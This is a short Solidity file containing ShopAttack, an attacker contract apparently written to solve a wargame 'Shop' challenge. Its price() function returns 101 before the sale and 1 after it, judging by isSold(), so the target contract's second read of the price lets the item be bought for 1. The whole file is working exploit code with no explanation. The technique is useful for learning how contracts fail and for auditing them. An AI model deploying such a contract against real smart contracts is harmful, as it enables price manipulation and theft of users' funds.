// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface Shop {
    function isSold()external view returns (bool);
    function buy() external;
    function price() external view returns (uint);
}
contract ShopAttack{
  Shop level21;
    constructor(address shopAddress){
        level21= Shop(shopAddress);
    }

    function attack() external {
        level21.buy();
    }

    function price () external view returns (uint) {
        return level21.isSold() ? 1 : 101;
    }
}